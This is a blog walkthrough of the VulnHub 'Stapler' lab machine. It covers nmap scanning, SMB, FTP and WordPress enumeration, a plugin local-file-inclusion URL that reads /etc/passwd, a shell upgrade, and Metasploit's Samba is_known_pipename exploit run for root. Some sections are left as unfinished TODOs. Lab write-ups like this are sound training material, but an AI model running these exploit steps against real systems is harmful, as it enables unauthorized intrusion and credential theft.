---
author: bhero
topic: vulnHub
---
Walkthrough for [Stapler](https://download.vulnhub.com/stapler/Stapler.zip)

## Setup
get stapler from the url above & setup vm: unzip and import

## Basic Enum

ping scan, find the machine:

```
nmap -T5 -sP 192.168.56.0-255
```

> Bonus: Turbo Mode
```
nmap -T5 --max-parallelism=100 -sP 192.168.56.0/24 | awk -v RS='([0-9]+\\.){3}[0-9]+' 'RT{print RT}'
```

returns a couple
192.168.56.1
192.168.56.104

lets assign the IP

``` bash
STAPLER_IP=192.168.56.104
```

Quick scan the services

``` bash
nmap $STAPLER_IP
#gives us:
Host is up (0.00055s latency).
Not shown: 992 filtered ports
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
53/tcp   open   domain
80/tcp   open   http
139/tcp  open   netbios-ssn
666/tcp  open   doom
3306/tcp open   mysql
```

Interesting, lots of ports open, doom? - What is that?
Lets check for hidden ports before we deep dive

``` bash
sudo nmap -sV -p- $STAPLER_IP 
#all ports scan with versions
Host is up (0.00034s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open   domain      dnsmasq 2.75
80/tcp    open   http        PHP cli server 5.5 or later
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.70%I=7%D=8/4%Time=5D470155%P=x86_64-pc-linux-gnu%r(NULL
SF:,1DA8,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x15
SF:2\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04
SF:\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2
SF:\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x
SF:0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb
SF:2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\
SF:xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3
SF:\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0
SF:\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x8
SF:7\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf
SF:4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xd
SF:c\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5
SF:\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf
SF:\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\
SF:xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x
SF:8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\x
SF:e7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\
SF:xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x
SF:9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\x
SF:f1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\x
SF:f8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\
SF:xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\x
SF:d2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\
SF:xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[
SF:\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xc
SF:c\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7
SF:\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\x
SF:fd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96
SF:\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\
SF:xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\
SF:xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x
SF:88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbc
SF:L}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\
SF:.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\x
SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf
SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?
SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:A6:27:5F (Oracle VirtualBox virtual NIC)
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.90 seconds
```

## Triage

20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later

There is an FTP server, probrably an Active server as port 20 returns closed. In passive mode the client initiates the connection and port 20 rarely refuses connection. This might imply IP whitelisting

22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)

Suggestive that box is Linux, windows rarely uses port 22 for ssh. This service will be hard to interact with if we can't get valid credentials 

53/tcp    open   domain      dnsmasq 2.75

DNS is often used to hide useful features on box via whitelisting. This is particularly true in more advanced boxes in VulnHub. It is difficult to enumerate without configuring networking on the attacker box, but can often be used for a quick enumeration win. I

80/tcp    open   http        PHP cli server 5.5 or later
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))

HTTP servers are open by default. This is typically the best place to start when enumerating a server as web sites are great places to get RCE.

123/tcp   closed ntp

Network Time, useful to know it is closed but no help just now

137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

SMB uses either IP port 139 or 445. SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network. Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet. The supporting ports 137 (name service) and 138 (datagram) are used for NetBIOS on the WinTEL stack. This helps nmap best guess a Linux service, interesting that we are using 139 and NOT 445.

3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1

Standard port for mysqldb access, this should be set to local host-only access. Usually requires a login. Confirms that we have a LAMP stack on the box, and if we were bad guys this would be a value extraction service.

666/tcp   open   doom?

For me, this is the most intersting port doom. Historically is the port for doom by Id Software, yet when we run the nmap scan we get what looks like ascii code:

```
SF-Port666-TCP:V=7.70%I=7%D=8/4%Time=5D470155%P=x86_64-pc-linux-gnu%r(NULL
SF:,1DA8,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x15
SF:2\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04
SF:\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2
SF:\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x
SF:0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb
SF:2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\
SF:xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3
SF:\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0
SF:\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x8
SF:7\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf
SF:4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xd
SF:c\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5
SF:\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf
SF:\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\
SF:xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x
SF:8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\x
SF:e7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\
SF:xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x
SF:9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\x
SF:f1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\x
SF:f8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\
SF:xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\x
SF:d2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\
SF:xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[
SF:\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xc
SF:c\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7
SF:\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\x
SF:fd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96
SF:\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\
SF:xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\
SF:xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x
SF:88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbc
SF:L}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\
SF:.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\x
SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf
SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?
SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0"); 
```
Could this be a custom app? Not low hanging fruit but possibly something interesting. 

### Pro/Con Summary

1. HTTP: Easy and safe to access - big target space 
2. DNS: Easy for quick enumeration - complex, requires configuration
3. FTP: Smaller target, value extraction - may need auth, unsafe
3. SAMBA: Smaller target, value extraction - may need auth, unsafe
4. DOOM 666: Unkown service - Risky
5. MySQL: Value extraction - may need auth, unsafe
6. SSH: Server Control - may need auth, unsafe

## Lets go Harder

Start port 53, it is quickest to check for special info and is easy to queue up scripts for.

launching the following script is noisy, but useful for dns services 
``` bash
sudo nmap -Pn -sU -p 53 --script=dns* $STAPLER_IP
```
It takes ages and _SPOILER_ there are no issues picked up here why?

Lets investigate,

``` bash
nslookup $STAPLER_IP
** server can't find 104.56.168.192.in-addr.arpa: NXDOMAIN
``` 
Ah, the VM is not recognised on our DNS. This is pretty typical of Vulnhub Boxes as they aren't on our `real` network. We could set this to our /etc/hosts and continue our hunt, we won't for now as we have no idea what else there is. 
Lets run some manual testing, open interactive nslookup with ```nslookup```
we can play with the following commands

``` bash
# list primary domain server: 
d1
# list secondary domain server: 
d2
# specify all dns record types and change dns server
set type=any
server 192.168.56.104
# Query new dns server for all records
192.168.55.104
```
comes back
```
** server can't find 104.55.168.192.in-addr.arpa: REFUSED
```
darn, no quick wins here because we don't have permissions. Might be something we can play with later, lets park DNS for now and move on to something else.

## SAMBA

lets aggressive scan the service to get an idea of what we have

```bash
nmap -A -p 139 $STAPLER_IP
# returns
Nmap scan report for 192.168.56.104
Host is up (0.00034s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: RED

Host script results:
|_clock-skew: mean: 39m58s, deviation: 34m37s, median: 59m57s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2019-08-04T20:57:07+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-08-04 20:57:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.52 seconds
```
the __smb-security-mode__ script suggests we can enumerate with a guest login.

A quick(ish) scripted enum to file for the server can be done via ```enum4linux``
```
sudo enum4linux -U -S -G -P -o -n -i $STAPLER_IP > samba_enum.txt
```
but we're going oldschool:
``` bash
smbclient -L $STAPLER_IP
# blank password gives

 Sharename       Type      Comment
 ---------       ----      -------
 print$          Disk      Printer Drivers
 kathy           Disk      Fred, What are we doing here?
 tmp             Disk      All temporary files should be stored here
 IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
```
on examination as kathy (//fred/kathy also works)
``` bash
smbclient //kathy/kathy -I $STAPLER_IP -N
ls
cd kathy stuff\ #might need to tab it in!
get todo-list.txt
cd ..\backup
# ooh wordpress-4.tar.gz, could be interesting for source code review but useful for http
get vsftpd.conf
```
```
smbclient //kathy/tmp -I $STAPLER_IP -N
get ls
```

we can determin a few things from these files:
FTP has anon login
fred and kathy are both users

-----------------------------

Lets look at ftp

``` bash
ftp $STAPLER_IP 
# another user harry
anonymous
ls
#lets get the file
get note
```
After reading the note, elly is another user, and she has an ftp account!
not much else we can do from here without going fully on the offensive, lets move on.

-----------------------------


Port 666 is interesting, it looks like we might have a potential custom app.
lets investigate with nc

``` bash
# connect to vitim on port 666
nc $STAPLER_IP 666
```

This gives us what looks like binary data, lets stick it in a file and see what we have.

``` bash
nc $STAPLER_IP 666 > doom && file doom
# returns
doom: Zip archive data, at least v2.0 to extract
# a zip?!? Lets rename and unpack
mv doom doom.zip && unzip doom.zip
```

this gives us a message2.jpg
``` bash
#check the jpeg for hidden stuff:
file message2.jpg 
strings message2.jpg
# maybe an actual cookie? potentially just an easter egg though.
```

![message2.jpg](/assets/vulnhub_stuff/message2.jpg)

We get another potential user, scott

this takes us up to 5 users:

1. fred - smb
2. kathy - smb
3. harry - ftp
4. elly - ftp
5. scott - DOOM

-----------------------------

Time to try mysql

```
nmap -A -p 3306 $STAPLER_IP
```

I get some useful info, but nothing I can leverage
I try logging in as root
``` bash
mysql -h $STAPLER_IP -u root -p
#use toor to try
Enter password: 
ERROR 1045 (28000): Access denied for user 'root'@'192.168.56.1' (using password: YES)
```
looks like dB root can log in remotely, but I have no passwords.

I could try force my hand and brute force in, I have some usernames but there are still 2 services left.

-----------------------------

ssh is next, 

``` bash
nmap -A -p 22 $STAPLER_IP
```
gives a pretty standard response, but we get barry, another user from:

``` bash
ssh root@$STAPLER_IP
```
At this point I have a decent userlist starting to pop up

1. fred - smb
2. kathy - smb
3. harry - ftp
4. elly - ftp
5. scott - DOOM
6. barry - ssh

We'll park this for later and move onto the last services

-----------------------------

Before we start on the http services, lets take stock.

We have a user list:

1. fred - smb
2. kathy - smb
3. harry - ftp
4. elly - ftp
5. scott - DOOM
6. barry - ssh

We know the server is a development system, with the comments left in the services.
We know to look for a LAMP stack with Wordpress on Ubunbtu.
The MySql is open, but password protected.
FTP and Samba may offer us a file upload IF we fail to exploit the we service.

lets check the default website

```
curl http://192.168.56.104/
```
returns a 404, no webroot? interesting could be a dead site.
Lets try a nickto scan to see what we pick up

```
nikto -h $STAPLER_IP > HTTP80.txt 
```
Yeilds nothing, lets try the other one:

```
curl http://192.168.56.104:12380
```
wow, big info lets put it in a file:

```
curl http://192.168.56.104:12380 > 12380_index.html
```

code review gets another user __Zoe__

and a base64 encoded image:
![decoded_20190804155642.jpeg](/assets/vulnhub_stuff/decoded_20190804155642.jpeg)

the base64 encoding _might_ give us an avenue to attack later if we have trouble uploading a shell.

Doesn't appear to be any standard links within the site, lets check robots.txt to see if we have anything else to go on.

Viewing in the browser loads the index page, but the reload is strange almost a notable delay, try curl 

```
curl http://192.168.56.104:12380/robots.txt
```

get the same result. Looks like I'm stuck, try nikto again

```
nikto -h $STAPLER_IP:12380 > HTTP12380.txt
```

looking at it shows 2 hits from robots.txt:
* /admin112233/
* /blogblog/

and one from brute force:
* /phpmyadmin/

This is weird, lets try a curl for headers 

``` bash 
curl -I http://192.168.56.104:12380
#note dave
HTTP/1.1 400 Bad Request
Date: Sun, 04 Aug 2019 22:14:55 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Fri, 03 Jun 2016 16:55:33 GMT
ETag: "6a16a-53462974b46e8"
Accept-Ranges: bytes
Content-Length: 434538
Dave: Soemthing doesn't look right here
Connection: close
Content-Type: text/html
```

lets try https

``` bash
curl https://192.168.56.104:12380/robots.txt
# ah ha!
curl: (60) SSL certificate problem: self signed certificate
```
force ssl

``` bash
curl https://192.168.56.104:12380/robots.txt -k
# works
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```

lets try the sites:
``` bash
# close call!
curl https://192.168.56.104:12380/admin112233/ -k
# the wp site!
curl https://192.168.56.104:12380/blogblog/ -k
# phpmyadmin
curl https://192.168.56.104:12380/phpmyadmin/ -k
```

-----------------------------

## Attack Time

Now it's time to attack!

phpmyadmin is a good value extraction if we can get access, lets check it first.

From the browser phpmyadmin site looks boilerplate. 
phpmyadmin traditionally is a good value extraction and has potential for RCE if the site is misconfigured but we need access. Older versions do have exploit paths, lets check the source code for the version.

This line, suggests we are looking at version 4.5.4.1. We can't be 100%, but the site looks like a default configuration, making this a hard sell without access.

```html
<link rel="stylesheet" type="text/css" href="./themes/pmahomme/css/printview.css?v=4.5.4.1deb2ubuntu1" ....
```

``` bash
searchsploit phpmyadmin
```

Confirms it, without a new exploit we're going to need authentication to make use of this.

Lets turn our attention to the Wordpress site, again from the source code it looks pretty standard wordpress.

Lets check if there is a default admin page: https://192.168.56.104:12380/blogblog/wp-admin

theres a bit of a redirect, lets curl it and view the headers

```
curl -k https://192.168.56.104:12380/blogblog/wp-admin -I
curl -k https://192.168.56.104:12380/blogblog/wp-admin -IL
```

Some Custom headers, auth perhaps? Remember the source code from the share? 
Might be worth investigating that later if we get stuck. - Spoiler we won't

A source code audit is not my strong suit, I'll put a pin in that to revisit.
Instead lets look to WP to see if it is carrying any of its halmark weaknesses... users and plugins!

first lets kick off a nikto scan:
```
nikto -h https://192.168.56.104:12380/blogblog/ > HTTPSblogblog.txt
```

looks like a standard wp site, lets dig deeper

``` bash
# check for users using wpscan
wpscan --url https://192.168.56.104:12380/blogblog/ --enumerate u --disable-tls-checks -o wpscan_users.txt
```

wpscan also has a mode for checking vuln plugins, but I typically have limited success in determining _vulnerable_ plugins with this tool, we'll search for all plugins and check manually.

```
wpscan --url https://192.168.56.104:12380/blogblog/ --enumerate ap --disable-tls-checks --plugins-detection aggressive -o wpscan_plugins.txt
```
this takes a little time, but eventually we see directory listing is available and the plugins are here ```https://192.168.56.104:12380/blogblog/wp-content/plugins/```

lets check searchsploit for the video plugin:

``` bash
searchsploit wordpress plugin video advanced
# gives us
WordPress Plugin Advanced Video 1.0 - Local File Inclusion                         | exploits/php/webapps/39646.py
```

LFI... now we are talking!

```
cp /usr/share/exploitdb/exploits/php/webapps/39646.py .
```

the PoC code in the exploit suggests that we can test the functionality with this url:
http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]

if we go to ```https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=/etc/passwd``` we should create a file upload with the contents of /etc/passwd.

the exploit produces a success of sorts and a url. Following the url we get a 404. hmmmm so what happened? 



# TODO!!!!
Well lets look at what the plugin does

/blogblog/wp-content/uploads/

> Bonus Shell upgrade - TODO
``` bash
python -c 'import pty; pty.spawn("/bin/bash")'
# background with Ctl^Z
stty raw -echo
fg
```

# Hit Hard!

## Eternal Red Exploit to root: 

We get a lot of good info, but of most interest is the Samba version: 4.3.9-Ubuntu

searchsploit samba 4.
``` bash
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                          | exploits/linux/remote/42084.rb
```

ok, this should be a point, aim and shoot win.
lets fie up msf:
``` bash
mfsconsole
search is_known_pipename
use exploit/linux/samba/is_known_pipename 
show options
set RHOSTS 192.168.56.104 #
set RPORT 139
set payload cmd/unix/interact
run

#this should get a shell, spawn a bash one:
python -c 'import pty; pty.spawn("/bin/bash")'
#then show root
id
```

